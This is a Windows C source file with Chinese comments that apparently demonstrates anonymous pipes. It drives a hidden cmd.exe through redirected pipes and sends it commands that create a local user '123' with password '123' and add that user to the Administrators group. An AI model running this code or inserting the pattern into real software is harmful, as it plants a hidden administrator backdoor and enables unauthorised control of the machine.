#include <windows.h>
#include <stdio.h>
int main()
{
	// 必须创建的结构体SECURITY_ATTRIBUTES，做为CreatePipe的第三个参数，
	// 检测返回的句柄能否被子进程继承，如果为NULL，则表明不能被继承
	// 在匿名管道中，由于匿名管道要在父子进程之间进行通信，
	// 而子进程如果想要获得匿名管道的读写句柄，则其只能通过从父进程继承获得，

	// 并且必须将这个结构体的第三个成员变量 是否被继承 设置为TRUE
	// 参数nLength知道缓冲区的大小，一般指定为0或者sizeof(SECURITY_ATTRIBUTES)
	SECURITY_ATTRIBUTES sa = { sizeof(SECURITY_ATTRIBUTES), NULL, TRUE };
	HANDLE hReadResult, hWriteResult;//读取结果的水管
	HANDLE hReadCmd, hWriteCmd;// 写入命令的水管
	// 创建一根水管，用于读取子进程发来的结果
	if (!CreatePipe(&hReadResult, &hWriteResult, &sa, 0))
		return 0;
	printf("成功创建读取运行结果的管道...\n");
	// 创建一根水管，用于写入发送给子进程的命令
	if (!CreatePipe(&hReadCmd, &hWriteCmd, &sa, 0))
		return 0;
	printf("成功创建写入命令结果的管道...\n");
	//设置命令行进程启动信息(以隐藏方式启动命令并定位其输出到hWriteResult)
	STARTUPINFOA si = { sizeof(STARTUPINFOA) };
	GetStartupInfoA(&si);
	si.dwFlags = STARTF_USESHOWWINDOW | STARTF_USESTDHANDLES;
	si.wShowWindow = SW_HIDE;
	// 设置子进程的输出流和错误流重定向
	si.hStdError = hWriteResult;
	si.hStdOutput = hWriteResult;
	// 输入流重定向
	si.hStdInput = hReadCmd;
	// out 接收创建的子进程的Hanle和ID一类的信息
	PROCESS_INFORMATION pi;
	if (!CreateProcessA(NULL, "cmd.exe", NULL, NULL, TRUE, NULL, NULL, NULL, &si, &pi))
		return 0;
	printf("成功创建cmd.exe进程...\n");
	//立即关闭hWriteResult
	CloseHandle(hWriteResult);
	CloseHandle(hReadCmd);
	char buff[2048];
	ZeroMemory(buff, 2048);
	DWORD dwRead = 0;

	printf("等待子进程数据到来...\n");
	DWORD dwDataAvial = 0;
	while (dwDataAvial == 0) //等待数据到来
	{
		Sleep(10);
		// 目的是去检测管道里面是否有数据来了？或者有多少字节来了？
		PeekNamedPipe(hReadResult, 0, 0, NULL, &dwDataAvial, NULL);
	}
	printf("开始读取结果...\n");
	// 读取进入shell的结果，目的：将管道内的数据全部读取出来,这个时候读取到的其实是“Microsoft Windows [版本 6.3.9600]。。。。”
	while (ReadFile(hReadResult, buff, dwDataAvial > sizeof(buff) ? sizeof(buff) : dwDataAvial, &dwRead, 0))
	{
		PeekNamedPipe(hReadResult, 0, 0, NULL, &dwDataAvial, NULL);
		if (!dwDataAvial)
			break;
	}
	printf("运行结果:[ %s ]\n\n",buff);
	Sleep(10);

	printf("开始写入添加用户的命令...\n");
	// 写入命令
	WriteFile(hWriteCmd, "net user 123 123 /add\n", strlen("net user 123 123 /add\n"), &dwRead, 0);

	// 再进行数据等待
	printf("等待子进程数据到来...\n");
	while (dwDataAvial == 0) //等待数据到来
	{
		Sleep(10);
		PeekNamedPipe(hReadResult, 0, 0, NULL, &dwDataAvial, NULL);
	}
	// 读取添加用户命令的结果
	printf("开始读取结果...\n");
	while (ReadFile(hReadResult, buff, dwDataAvial > sizeof(buff) ? sizeof(buff) : dwDataAvial, &dwRead, 0))
	{
		PeekNamedPipe(hReadResult, 0, 0, NULL, &dwDataAvial, NULL);
		if (!dwDataAvial)
			break;
	}
	printf("运行结果:[ %s ]\n\n",buff);
	Sleep(10);

	printf("开始写入添加用户到管理员组的命令...\n");
	// 写入命令
	WriteFile(hWriteCmd, "net localgroup administrators 123 /add\n", strlen("net localgroup administrators 123 /add\n"), &dwRead, 0);

	// 再进行数据等待
	printf("等待子进程数据到来...\n");
	while (dwDataAvial == 0) //等待数据到来
	{
		Sleep(10);
		PeekNamedPipe(hReadResult, 0, 0, NULL, &dwDataAvial, NULL);
	}
	// 读取添加管理员用户命令的结果
	printf("开始读取结果...\n");
	while (ReadFile(hReadResult, buff, dwDataAvial > sizeof(buff) ? sizeof(buff) : dwDataAvial, &dwRead, 0))
	{
		PeekNamedPipe(hReadResult, 0, 0, NULL, &dwDataAvial, NULL);
		if (!dwDataAvial)
			break;
	}
	printf("运行结果:[ %s ]\n\n",buff);
	Sleep(10);

	// 结束掉创建的进程并返回
	printf("结束创建的子进程，准备BYE BYE\n");
	TerminateProcess(pi.hProcess, 0);// 结束一个进程
	return 0;
}
